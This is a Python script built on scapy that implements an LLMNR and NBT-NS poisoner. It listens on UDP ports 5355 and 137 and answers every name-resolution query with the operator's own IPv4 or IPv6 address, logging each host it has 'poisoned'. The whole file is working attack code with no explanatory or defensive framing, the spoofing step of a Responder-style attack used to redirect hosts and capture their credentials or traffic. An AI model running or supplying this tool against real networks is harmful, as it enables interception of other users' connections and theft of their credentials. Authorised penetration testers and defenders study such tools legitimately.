from scapy.layers.dns import DNSRR
from scapy.layers.l2 import Ether
from scapy.layers.llmnr import LLMNRQuery, LLMNRResponse
from scapy.layers.inet6 import IPv6
from scapy.layers.inet import IP, UDP
from scapy.all import sniff
from scapy.layers.netbios import NBNSQueryRequest, NBNSHeader, NBNSQueryResponse, NBNS_ADD_ENTRY
from scapy.sendrecv import sendp

LOCAL_IP = ""
LOCAL_IPv6 = ""
IFACE = ""

def llmnr_callback(packet):

    llmnr_query = packet[LLMNRQuery]

    ether_i, addr_i, udp_i = extract_base_input_data(packet)

    ether_o, addr_o, udp_o = build_base_output_data(ether_i, addr_i, udp_i)

    if llmnr_query.qd[0].qtype == 1:
        ip = LOCAL_IP
    elif llmnr_query.qd[0].qtype == 28:
        ip = LOCAL_IPv6
    else:
        return

    llmnr_resp = LLMNRResponse(
        id=llmnr_query.id,
        qr=1, # Response
        tc=0,
        c=0,
        rcode=0,
        qd=llmnr_query,
        an=[
            DNSRR(
                rrname=llmnr_query.qd[0].qname,
                type=llmnr_query.qd[0].qtype,
                ttl=30,
                rdata=ip
            )
        ]

    )
    pkt = ether_o / addr_o / udp_o / llmnr_resp
    print(f"LLMNR poisoned for {addr_i.src}")

    sendp(pkt, iface=IFACE, verbose=3)




def build_address_pkt(pkt) -> IP | IPv6:
    if pkt.haslayer(IPv6):
        return IPv6(dst=pkt.src, src=LOCAL_IPv6, hlim=1)
    else:
        return IP(dst=pkt.src, src=LOCAL_IP, ttl=1)

def extract_base_input_data(pkt) -> tuple[Ether, IP | IPv6, UDP]:
    ether_i = pkt[Ether]

    udp_i = pkt[UDP]

    addr_i = pkt[IP] if pkt.haslayer(IP) else pkt[IPv6]
    return ether_i, addr_i, udp_i

def build_base_output_data(ether_i, addr_i, udp_i)-> tuple[Ether, IP | IPv6, UDP]:
    addr_o: IP | IPv6 = build_address_pkt(addr_i)

    udp_o: UDP = UDP(sport=udp_i.dport, dport=udp_i.sport)
    ether_o: Ether = Ether(dst=ether_i.src)
    return ether_o, addr_o, udp_o


def nbt_ns_callback(packet):
    # Ether / IP / UDP / NBNSHeader / NBNSQueryRequest who has '\\DC09'
    ether_i, addr_i, udp_i = extract_base_input_data(packet)
    ether_o, addr_o, udp_o = build_base_output_data(ether_i, addr_i, udp_i)
    nbns_header_i = packet[NBNSHeader]
    nbns_query_i = packet[NBNSQueryRequest]


    nm_flags = "AA"
    if "RD" in nbns_header_i.NM_FLAGS:
        nm_flags += "+RD"
    nbns_header_o = NBNSHeader(
        NAME_TRN_ID=nbns_header_i.NAME_TRN_ID,
        RESPONSE=1,
        OPCODE=0,
        RCODE=0,
        NM_FLAGS=nm_flags,
    )
    nbns_response = NBNSQueryResponse(
        RR_NAME=nbns_query_i.QUESTION_NAME,
        SUFFIX=nbns_query_i.SUFFIX,
        QUESTION_TYPE=nbns_query_i.QUESTION_TYPE,
        QUESTION_CLASS=nbns_query_i.QUESTION_CLASS,
        ADDR_ENTRY=[NBNS_ADD_ENTRY(
            G=0,
            NB_ADDRESS=LOCAL_IP
        )]

    )

    pkt = ether_o / addr_o / udp_o / nbns_header_o / nbns_response
    print(f"NBT-NS poisoned for {addr_i.src}")

    sendp(pkt, iface=IFACE, verbose=3)

def packet_callback(packet):
    if packet.haslayer(LLMNRQuery):
        llmnr_callback(packet)
    if packet.haslayer(NBNSQueryRequest):
        nbt_ns_callback(packet)

sniff(prn=packet_callback, filter="udp port 5355 or udp port 137", iface=IFACE)


# Ether / IPv6 / UDP fe80::3c2f:8143:aa26:4716:62799 > ff02::1:3:5355 / LLMNRQuery who has 'ac2.'